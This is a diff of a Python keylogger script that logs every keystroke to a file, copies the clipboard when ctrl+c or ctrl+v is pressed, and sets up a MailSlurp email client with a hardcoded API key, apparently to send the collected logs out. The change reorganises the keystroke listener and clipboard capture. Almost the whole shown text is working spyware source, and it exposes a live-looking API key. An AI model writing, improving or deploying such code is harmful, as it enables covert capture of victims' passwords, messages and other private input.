@@ -87,95 +87,6 @@ def copy_clipboard():
             f.write("Clipboard could not be copied\n")
 copy_clipboard()
 
-count = 0
-keys=[]
-def on_press(key):
-    global keys,count
-    print(key)
-    keys.append(key)
-    count += 1
-    if hasattr(key, 'char') and key.char == '\x03':
-        copy_clipboard()
-    elif hasattr(key, 'char') and key.char == '\x16':
-        copy_clipboard()
-
-    if count >= 1:
-        count = 0
-        write_file(keys)
-        keys =[]
-
-def write_file(keys):
-    with open(file_path+extend+keys_information,"a") as f:
-        for key in keys:
-            k=str(key).replace("'","")
-            if key==Key.space:
-                f.write(' [space] ')
-            elif key==Key.shift or key == Key.shift_l or key == Key.shift_r:
-                f.write(" [shift] \n")
-                f.close()
-            elif key == Key.ctrl_l or key == Key.ctrl_r:
-                f.write(" [ctrl] \n")
-                f.close()
-            elif key == Key.alt_l or key == Key.alt_gr:
-                f.write(" [alt] \n")
-                f.close()
-            elif key==Key.enter:
-                f.write(" [enter] \n")
-                f.close()
-            elif key == Key.backspace:
-                f.write(" [backspace] \n")
-                f.close()
-            elif key==Key.caps_lock:
-                f.write(" [caps_lock] \n")
-                f.close()
-            elif key==Key.tab:
-                f.write(" [tab] \n")
-                f.close()
-            elif key==Key.end:
-                f.write(" [end] \n")
-                f.close()
-            elif key==Key.home:
-                f.write(" [home] \n")
-                f.close()
-            elif key==Key.page_down:
-                f.write(" [page_down] \n")
-                f.close()
-            elif key==Key.page_up:
-                f.write(" [page_up] \n")
-                f.close()
-            elif key==Key.pause:
-                f.write(" [pause] \n")
-                f.close()
-            elif key==Key.insert:
-                f.write(" [insert] \n")
-                f.close()
-            elif key==Key.up:
-                f.write(" [up] \n")
-                f.close()
-            elif key==Key.down:
-                f.write(" [down] \n")
-                f.close()
-            elif key==Key.right:
-                f.write(" [right] \n")
-                f.close()
-            elif key==Key.left:
-                f.write(" [left] \n")
-                f.close()
-            elif key==Key.delete:
-                f.write(" [delete] \n")
-                f.close()
-
-            elif k.find("Key") == -1:
-                f.write(k)
-                f.close()
-
-def on_release(key):
-    if key==Key.esc:
-        return False
-    
-with Listener(on_press=on_press,on_release=on_release) as listener:
-    listener.join()
-
 # create a mailslurp configuration
 configuration = mailslurp_client.Configuration()
 configuration.api_key['x-api-key'] = "40a688f9057922a582256f5b0ac396ebf21f194681ac2b9a0c6dbc521be79dbe" #change api
@@ -252,3 +163,94 @@ while True:
     if time.time()-start_time==7200:
         tlog.reset()
         tlog.start()
+
+count = 0
+keys=[]
+def on_press(key):
+    global keys,count
+    print(key)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path+extend+keys_information,"a") as f:
+        for key in keys:
+            k=str(key).replace("'","")
+            if key==Key.space:
+                f.write(' [space] ')
+            elif hasattr(key, 'char') and key.char == '\x03':
+                f.write("ctrl+c")
+                copy_clipboard()
+            elif hasattr(key, 'char') and key.char == '\x16':
+                f.write("ctrl+v")
+                copy_clipboard()
+            elif key==Key.shift or key == Key.shift_l or key == Key.shift_r:
+                f.write(" [shift] \n")
+                f.close()
+            elif key == Key.ctrl_l or key == Key.ctrl_r:
+                f.write(" [ctrl] \n")
+                f.close()
+            elif key == Key.alt_l or key == Key.alt_gr:
+                f.write(" [alt] \n")
+                f.close()
+            elif key==Key.enter:
+                f.write(" [enter] \n")
+                f.close()
+            elif key == Key.backspace:
+                f.write(" [backspace] \n")
+                f.close()
+            elif key==Key.caps_lock:
+                f.write(" [caps_lock] \n")
+                f.close()
+            elif key==Key.tab:
+                f.write(" [tab] \n")
+                f.close()
+            elif key==Key.end:
+                f.write(" [end] \n")
+                f.close()
+            elif key==Key.home:
+                f.write(" [home] \n")
+                f.close()
+            elif key==Key.page_down:
+                f.write(" [page_down] \n")
+                f.close()
+            elif key==Key.page_up:
+                f.write(" [page_up] \n")
+                f.close()
+            elif key==Key.pause:
+                f.write(" [pause] \n")
+                f.close()
+            elif key==Key.insert:
+                f.write(" [insert] \n")
+                f.close()
+            elif key==Key.up:
+                f.write(" [up] \n")
+                f.close()
+            elif key==Key.down:
+                f.write(" [down] \n")
+                f.close()
+            elif key==Key.right:
+                f.write(" [right] \n")
+                f.close()
+            elif key==Key.left:
+                f.write(" [left] \n")
+                f.close()
+            elif key==Key.delete:
+                f.write(" [delete] \n")
+                f.close()
+
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key==Key.esc:
+        return False
+    
+with Listener(on_press=on_press,on_release=on_release) as listener:
+    listener.join()
